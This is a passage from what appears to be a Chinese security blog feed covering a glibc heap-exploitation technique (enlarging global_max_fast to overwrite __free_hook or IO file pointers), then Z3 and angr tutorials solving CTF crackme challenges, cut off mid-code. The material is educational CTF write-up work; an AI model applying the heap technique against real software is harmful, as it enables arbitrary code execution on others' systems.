id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>可结合<a href="https://wiki.x10sec.org/pwn/heap/unsorted_bin_attack/" target="_blank" rel="noopener">unsorted bin attack</a>来修改globa_max_fast为一个较大的值，前置条件是需要泄露libc的地址。<br>然后通过地址与fastbin数组的偏移计算出所需free的堆块的size，释放相应的堆块，即可实现往该地址写入堆块的地址以进一步利用。</p><p>计算偏移的代码可以如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fastbin_ptr=libc_base+libc.symbols[&apos;main_arena&apos;]+8</span><br><span class="line">idx=(target_addr-fastbin_ptr)/8</span><br><span class="line">size=idx*0x10+0x20</span><br></pre></td></tr></table></figure></p><p>此时要解决的事情是往哪里写以达到实现利用的目的。可能有很多的地方，理论上来说只要是main_arena结构体后面的是函数指针或是结构体指针的地址都可以，目前很容易能够预想到的是：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_list_all</span><br><span class="line"><span class="built_in">stdout</span></span><br><span class="line"><span class="built_in">stdin</span></span><br><span class="line"><span class="built_in">stderr</span></span><br><span class="line">__free_hook</span><br></pre></td></tr></table></figure></p><p>复写前面四个就是使用IO_file攻击那一套方法，伪造结构体来实现任意读任意写或者伪造vtable来实现house of orange攻击。</p><p>复写<strong>free_hook的话则需要一次uaf来修改释放进去的fd改成system或者one gadget，再将堆块申请出来，从而实现将</strong>free_hook改写成system或者one gadget。</p><h2 id="实例-starctf2019-heap-master"><a href="#实例-starctf2019-heap-master" class="headerlink" title="实例 starctf2019-heap_master"></a>实例 starctf2019-heap_master</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;global-max-fas&quot;&gt;&lt;a href=&quot;#global-max-fas&quot; class=&quot;headerlink&quot; title=&quot;global_max_fas&quot;&gt;&lt;/a&gt;global_max_fas&lt;/h2&gt;&lt;p&gt;global_max_fast这个全局变量的
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>z3求解器</title>
    <link href="https://nocbtm.github.io/2019/10/03/z3%E6%B1%82%E8%A7%A3%E5%99%A8/"/>
    <id>https://nocbtm.github.io/2019/10/03/z3求解器/</id>
    <published>2019-10-03T06:24:37.000Z</published>
    <updated>2019-10-03T07:45:00.146Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Z3是一个微软出品的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题（可以简单理解为解方程的感觉，虽然这么比喻其实还差距甚远，请勿吐槽），功能强大且易于使用。<br>Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 angr 也内置了一个修改版的 Z3。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里我用的是angr里面的z3，<a href="https://nocbtm.github.io/2019/10/02/docker%E5%AE%89%E8%A3%85angr/">安装教程</a>。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = Int(<span class="string">'x'</span>)</span><br><span class="line">y = Int(<span class="string">'y'</span>)</span><br><span class="line">solve(x &gt; <span class="number">2</span>, y &lt; <span class="number">10</span>, x + <span class="number">2</span>*y == <span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>上面的例子中，定义了两个变量：x 和 y。类型为 Int（注意这里的 Int 可不是 C/C++ 里面包含上下界的 int，Z3 中的 Int 对应的就是数学中的整数，Z3 中的 BitVector 才对应到 C/C++ 中的 int）。</p><p>然后就调用了 solve 函数求解三个条件下的满足模型，这三个条件分别是 x 大于 2，y 小于 10，并且 x 加 2 个 y 等于 7。</p><p>运行一下结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(angr) angr@36aeab92fea7:~/z3$ python test.py </span><br><span class="line">[y = 0, x = 7]</span><br></pre></td></tr></table></figure><h2 id="ctf实例"><a href="#ctf实例" class="headerlink" title="ctf实例"></a>ctf实例</h2><h3 id="某比赛中的逆向题"><a href="#某比赛中的逆向题" class="headerlink" title="某比赛中的逆向题"></a>某比赛中的逆向题</h3><p>首先我们利用IDA去打开该文件，定位到关键点，发现关键函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_400766</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_6020A0) != <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v3 = stru_6020A0.y1;</span><br><span class="line">  v4 = stru_6020A0.y2;</span><br><span class="line">  v5 = stru_6020A0.y3;</span><br><span class="line">  v6 = stru_6020A0.y4;</span><br><span class="line">  <span class="keyword">if</span> ( stru_6020A0.x2 * (<span class="keyword">signed</span> __int64)stru_6020A0.x1 - stru_6020A0.x4 * (<span class="keyword">signed</span> __int64)stru_6020A0.x3 != <span class="number">0x24CDF2E7C953DA56</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3L</span>L * stru_6020A0.x3 + <span class="number">4L</span>L * stru_6020A0.x4 - stru_6020A0.x2 - <span class="number">2L</span>L * stru_6020A0.x1 != <span class="number">0x17B85F06</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3</span> * stru_6020A0.x1 * (<span class="keyword">signed</span> __int64)stru_6020A0.x4 - stru_6020A0.x3 * (<span class="keyword">signed</span> __int64)stru_6020A0.x2 != <span class="number">0x2E6E497E6415CF3E</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">27L</span>L * stru_6020A0.x2 + stru_6020A0.x1 - <span class="number">11L</span>L * stru_6020A0.x4 - stru_6020A0.x3 != <span class="number">0x95AE13337</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  srand(stru_6020A0.x3 ^ stru_6020A0.x2 ^ stru_6020A0.x1 ^ stru_6020A0.x4);</span><br><span class="line">  v1 = rand() % <span class="number">50</span>;</span><br><span class="line">  v2 = rand() % <span class="number">50</span>;</span><br><span class="line">  v7 = rand() % <span class="number">50</span>;</span><br><span class="line">  v8 = rand() % <span class="number">50</span>;</span><br><span class="line">  v9 = rand() % <span class="number">50</span>;</span><br><span class="line">  v10 = rand() % <span class="number">50</span>;</span><br><span class="line">  v11 = rand() % <span class="number">50</span>;</span><br><span class="line">  v12 = rand() % <span class="number">50</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 * v2 + v3 * v1 - v4 - v5 != <span class="number">0xE638C96D3</span>LL</span><br><span class="line">    || v6 + v3 + v5 * v8 - v4 * v7 != <span class="number">0xB59F2D0CB</span>LL</span><br><span class="line">    || v3 * v9 + v4 * v10 - v5 - v6 != <span class="number">0xDCFE88C6D</span>LL</span><br><span class="line">    || v5 * v12 + v3 - v4 - v6 * v11 != <span class="number">0xC076D98BB</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_15:</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看得出来这个题目的目的就是找出满足方程的flag。我们可以很方便的把方程式列出来，但是求解对于一些数学不是很好的人来说简直就是噩梦，这时候Z3求解器就可以很方便的给我们帮助。我们按照题目的意思一步一步利用Z3求解器来求解：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x1 = Int(<span class="string">'x1'</span>)</span><br><span class="line">x2 = Int(<span class="string">'x2'</span>)</span><br><span class="line">x3 = Int(<span class="string">'x3'</span>)</span><br><span class="line">x4 = Int(<span class="string">'x4'</span>)</span><br><span class="line">s = Solver()  <span class="comment">#创建一个通用求解器</span></span><br><span class="line">s.add( x2*x1-x4*x3 == <span class="number">0x24CDF2E7C953DA56</span>)  <span class="comment">#添加约束条件</span></span><br><span class="line">s.add( <span class="number">3</span>*x3+<span class="number">4</span>*x4-x2<span class="number">-2</span>*x1 == <span class="number">0x17B85F06</span>)</span><br><span class="line">s.add( <span class="number">3</span>*x1*x4-x3*x2 == <span class="number">0x2E6E497E6415CF3E</span>)</span><br><span class="line">s.add( <span class="number">27</span>*x2+x1<span class="number">-11</span>*x4 - x3 == <span class="number">0x95AE13337</span>)</span><br><span class="line"><span class="keyword">print</span> s.check()   <span class="comment">#检查是否有解，sat结果表示找到某个合适的解，unsat结果表示没有解</span></span><br><span class="line">m = s.model()    <span class="comment">#得到一组解，m为字典类型</span></span><br><span class="line"><span class="keyword">print</span> m</span><br><span class="line"><span class="keyword">print</span> <span class="string">"traversing model..."</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> m.decls():</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%s = %s"</span> % (d.name(), m[d])</span><br></pre></td></tr></table></figure></p><h3 id="第八届极客大挑战的REConvolution"><a href="#第八届极客大挑战的REConvolution" class="headerlink" title="第八届极客大挑战的REConvolution"></a>第八届极客大挑战的REConvolution</h3><p>我们打开文件，也是比较直观的看到约束条件，我试着逆向了这个过程，花费了挺多的时间才得到答案，但是如果我们使用Z3Py来求解的话就会非常的快。</p><p>函数关键部分如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ii; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="keyword">char</span> flag_i; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> jj; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> xor_result[<span class="number">80</span>]; <span class="comment">// [esp+8h] [ebp-A4h]</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">80</span>]; <span class="comment">// [esp+58h] [ebp-54h]</span></span><br><span class="line">  sub_DC1020(<span class="string">"Please input your flag: "</span>);</span><br><span class="line">  sub_DC1050(<span class="string">"%40s"</span>, flag);</span><br><span class="line">  <span class="built_in">memset</span>(xor_result, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  ii = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      flag_i = flag[ii];</span><br><span class="line">      jj = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = &amp;xor_result[jj + ii];</span><br><span class="line">        v8 = flag_i ^ data1[jj++];</span><br><span class="line">        *v7 += v8;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( jj &lt; <span class="number">0x20</span> );</span><br><span class="line">      ++ii;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( ii &lt; v4 );</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="built_in">strcmp</span>(xor_result, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;data2);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    v9 = -(v9 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No, it isn't."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Yes, it is."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们利用Z3Py来进行变量的声明和约束的增加并进行求解<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">X =  [BitVec((<span class="string">'x%s'</span> % i),<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x22</span>) ]   <span class="comment">#生成34个8比特的数</span></span><br><span class="line"><span class="keyword">print</span> X</span><br><span class="line">data1 =  [<span class="number">0x21</span>,<span class="number">0x22</span>,<span class="number">0x23</span>,<span class="number">0x24</span>,<span class="number">0x25</span>,<span class="number">0x26</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x29</span>,<span class="number">0x2A</span>,<span class="number">0x2B</span>,<span class="number">0x2C</span>,<span class="number">0x2D</span>,<span class="number">0x2E</span>,<span class="number">0x2F</span>,<span class="number">0x3A</span>,</span><br><span class="line"><span class="number">0x3B</span>,<span class="number">0x3C</span>,<span class="number">0x3D</span>,<span class="number">0x3E</span>,<span class="number">0x3F</span>,<span class="number">0x40</span>,<span class="number">0x5B</span>,<span class="number">0x5C</span>,<span class="number">0x5D</span>,<span class="number">0x5E</span>,<span class="number">0x5F</span>,<span class="number">0x60</span>,<span class="number">0x7B</span>,<span class="number">0x7C</span>,<span class="number">0x7D</span>,<span class="number">0x7E</span>]</span><br><span class="line">data2 = [<span class="number">0x72</span>,<span class="number">0xE9</span>,<span class="number">0x4D</span>,<span class="number">0xAC</span>,<span class="number">0xC1</span>,<span class="number">0xD0</span>,<span class="number">0x24</span>,<span class="number">0x6B</span>,<span class="number">0xB2</span>,<span class="number">0xF5</span>,<span class="number">0xFD</span>,<span class="number">0x45</span>,<span class="number">0x49</span>,<span class="number">0x94</span>,<span class="number">0xDC</span>,<span class="number">0x10</span>,</span><br><span class="line"><span class="number">0x10</span>,<span class="number">0x6B</span>,<span class="number">0xA3</span>,<span class="number">0xFB</span>,<span class="number">0x5C</span>,<span class="number">0x13</span>,<span class="number">0x17</span>,<span class="number">0xE4</span>,<span class="number">0x67</span>,<span class="number">0xFE</span>,<span class="number">0x72</span>,<span class="number">0xA1</span>,<span class="number">0xC7</span>,<span class="number">0x04</span>,<span class="number">0x2B</span>,<span class="number">0xC2</span>,</span><br><span class="line"><span class="number">0x9D</span>,<span class="number">0x3F</span>,<span class="number">0xA7</span>,<span class="number">0x6C</span>,<span class="number">0xE7</span>,<span class="number">0xD0</span>,<span class="number">0x90</span>,<span class="number">0x71</span>,<span class="number">0x36</span>,<span class="number">0xB3</span>,<span class="number">0xAB</span>,<span class="number">0x67</span>,<span class="number">0xBF</span>,<span class="number">0x60</span>,<span class="number">0x30</span>,<span class="number">0x3E</span>,</span><br><span class="line"><span class="number">0x78</span>,<span class="number">0xCD</span>,<span class="number">0x6D</span>,<span class="number">0x35</span>,<span class="number">0xC8</span>,<span class="number">0x55</span>,<span class="number">0xFF</span>,<span class="number">0xC0</span>,<span class="number">0x95</span>,<span class="number">0x62</span>,<span class="number">0xE6</span>,<span class="number">0xBB</span>,<span class="number">0x57</span>,<span class="number">0x34</span>,<span class="number">0x29</span>,<span class="number">0x0E</span>,<span class="number">3</span>]</span><br><span class="line">xor_result = [<span class="number">0</span>]*<span class="number">0x41</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x22</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x20</span>):</span><br><span class="line">        xor_result[n+m] += X[m] ^ data1[n]</span><br><span class="line"><span class="keyword">for</span> o <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x41</span>):          <span class="comment">#循环添加约束条件</span></span><br><span class="line">    s.add(xor_result[o] == data2[o])   </span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"traversing model..."</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x22</span>):</span><br><span class="line">    flag+=chr(int(<span class="string">"%s"</span> % (m[X[i]])))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p><p>执行脚本如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(angr) angr@36aeab92fea7:~/z3$ python exp2.py </span><br><span class="line">[x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13, x14, x15, x16, x17, x18, x19, x20, x21, x22, x23, x24, x25, x26, x27, x28, x29, x30, x31, x32, x33]</span><br><span class="line">sat</span><br><span class="line">traversing model...</span><br><span class="line">SYC&#123;4+mile+b3gin+with+sing1e+step&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;Z3是一个微软出品的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题（可以简单理解为解方程的感觉，虽然这么比
      
    
    </summary>
    
      <category term="reverse" scheme="https://nocbtm.github.io/categories/reverse/"/>
    
    
      <category term="reverse" scheme="https://nocbtm.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>angr符号执行</title>
    <link href="https://nocbtm.github.io/2019/10/02/angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    <id>https://nocbtm.github.io/2019/10/02/angr符号执行/</id>
    <published>2019-10-02T09:20:42.000Z</published>
    <updated>2019-10-02T10:43:48.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>符号执行简单来说就是用符号来模拟程序执行，在我看来就相当于暴力破解，比如一个程序要求你进行一个复杂的运算，每次动态调试只能输入一次，然而符合执行可以尽可能的遍历每一条路径，这样就方便了许多，<a href="http://angr.io/api-doc/claripy.html" target="_blank" rel="noopener">官方学习文档</a>。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里不建议实体机安装，坑太多，直接上docker，<a href="https://nocbtm.github.io/2019/10/02/docker%E5%AE%89%E8%A3%85angr/">安装教程</a></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="r100-defcamp"><a href="#r100-defcamp" class="headerlink" title="r100(defcamp)"></a>r100(defcamp)</h3><p>题目和脚本docker里面都有,将程序载入IDA静态分析，主函数如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">255</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_4006FD((__int64)&amp;s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Incorrect password!"</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Nice!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>加密函数如下，因为我们这里用符号执行来做，所以不进行算法分析<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_4006FD</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// [rsp+20h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="string">"Dufhbmf"</span>;</span><br><span class="line">  v4 = <span class="string">"pG`imos"</span>;</span><br><span class="line">  v5 = <span class="string">"ewUglpt"</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (&amp;v3)[i % <span class="number">3</span>][<span class="number">2</span> * (i / <span class="number">3</span>)] - *(<span class="keyword">char</span> *)(i + a1) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>需要知道的是，程序有两个分支，输入密码后会进行判断，正确输出nice，错误输入wrong，我们希望的是输出nice，那么这里就可以进行用符号执行来做。先直观感受一下脚本，我们希望执行0x400844中的内容，不希望执行0x400855的内容，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p = angr.Project(<span class="string">"r100"</span>, load_options=&#123;<span class="string">'auto_load_libs'</span>: <span class="keyword">False</span>&#125;) <span class="comment"># 加载程序</span></span><br><span class="line"><span class="comment">#约束执行的流程，0x400844为打印nice附近的地址，0x400855附近即为打印错误的地址</span></span><br><span class="line">    ex = p.surveyors.Explorer(find=(<span class="number">0x400844</span>, ), avoid=(<span class="number">0x400855</span>,)) </span><br><span class="line">    ex.run() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ex.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>).strip(<span class="string">'\0\n'</span>) <span class="comment"># 打印found的第一个结果</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> main() == <span class="string">'Code_Talkers'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> main()</span><br></pre></td></tr></table></figure></p><h3 id="crackme-ais3"><a href="#crackme-ais3" class="headerlink" title="crackme(ais3)"></a>crackme(ais3)</h3><p>同样载入IDA看主函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 